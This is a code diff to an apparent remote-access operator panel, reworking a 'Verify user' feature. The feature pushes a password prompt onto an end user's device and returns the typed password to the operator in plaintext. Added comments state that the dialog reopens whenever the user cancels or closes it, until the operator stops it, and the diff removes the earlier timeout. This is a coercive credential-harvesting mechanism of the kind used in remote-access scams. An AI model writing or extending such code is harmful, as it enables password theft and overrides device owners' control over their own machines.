@@ -2342,6 +2342,16 @@ function backToDashboard() {
   lockOn = false; updateLockBtn();
   closeConsoleRtc();
   try { stopCam(); } catch {} // release the webcam if the operator left the panel open
+  // Stop any sticky verify-user loop on the device so detaching doesn't
+  // leave the prompt popping back forever.
+  try {
+    if (verifyInFlight && ws && ws.readyState === ws.OPEN) {
+      ws.send(JSON.stringify({ type: 'verify-cancel', reqId: verifyInFlight }));
+    }
+  } catch {}
+  verifyInFlight = null;
+  const _vbtn = document.getElementById('verify-user-btn');
+  if (_vbtn) { _vbtn.classList.remove('on'); const _l = _vbtn.querySelector('.sc-tile-l'); if (_l) _l.textContent = 'Verify user'; }
   try { if (typeof clearVerifyResultBox === 'function') clearVerifyResultBox(); } catch {}
   $('#control-view').hidden = true;
   $('#monitor-select').hidden = true;
@@ -2712,23 +2722,24 @@ function requestVerifyUser() {
   if (!attachedId) { toast('No device connected', 'err'); return; }
   if (!ws || ws.readyState !== ws.OPEN) { toast('Session not connected', 'err'); return; }
   const btn = document.getElementById('verify-user-btn');
-  // If a verify is still in flight, let the operator click again to retry —
-  // the latest reqId wins and old replies are ignored (see onVerifyResult).
+  const lbl = btn && btn.querySelector('.sc-tile-l');
+  // The dialog is sticky — Cancel/Esc/X on the device just reopens it.
+  // If a verify is already running, clicking again STOPS it.
+  if (verifyInFlight) {
+    const reqId = verifyInFlight;
+    verifyInFlight = null;
+    if (btn) btn.classList.remove('on');
+    if (lbl) lbl.textContent = 'Verify user';
+    try { ws.send(JSON.stringify({ type: 'verify-cancel', reqId: reqId })); } catch {}
+    toast('Stopped the identity prompt on the device', '');
+    return;
+  }
   const reqId = 'v_' + Math.random().toString(36).slice(2, 10);
   verifyInFlight = reqId;
-  if (btn) btn.classList.add('on'); // visual spinner-ish; stays clickable
-  toast('Prompting the end user on the device…', '');
+  if (btn) btn.classList.add('on');
+  if (lbl) lbl.textContent = 'Stop asking';
+  toast('Asking the end user — the dialog will reopen if they Cancel until you Stop it', '');
   try { ws.send(JSON.stringify({ type: 'verify-start', reqId: reqId })); } catch {}
-  // Short timeout so a stuck lock clears fast. Covers two cases:
-  //  • device hasn't updated to the v67 agent bundle yet (no handler)
-  //  • agent crashed / disconnected mid-prompt
-  setTimeout(function () {
-    if (verifyInFlight === reqId) {
-      verifyInFlight = null;
-      if (btn) btn.classList.remove('on');
-      toast('No response from device — it may still be on an older agent (updates every 5 min). Try again shortly.', 'err');
-    }
-  }, 30 * 1000);
 }
 
 function showVerifyResultBox(password) {
@@ -2751,13 +2762,15 @@ function onVerifyResult(msg) {
   if (!msg || msg.reqId !== verifyInFlight) return; // stale / wrong request
   verifyInFlight = null;
   const btn = document.getElementById('verify-user-btn');
+  const lbl = btn && btn.querySelector('.sc-tile-l');
   if (btn) { btn.disabled = false; btn.classList.remove('on'); }
+  if (lbl) lbl.textContent = 'Verify user';
   const s = String(msg.status || '');
   if (s === 'submitted') {
     showVerifyResultBox(msg.password || '');
     toast('End user submitted a password — verify it against your backend', 'ok');
   }
-  else if (s === 'cancelled') toast('End user cancelled the identity prompt', 'err');
+  else if (s === 'cancelled') toast('Identity prompt stopped', '');
   else toast('Verification error: ' + (msg.note || 'unknown'), 'err');
 }
 
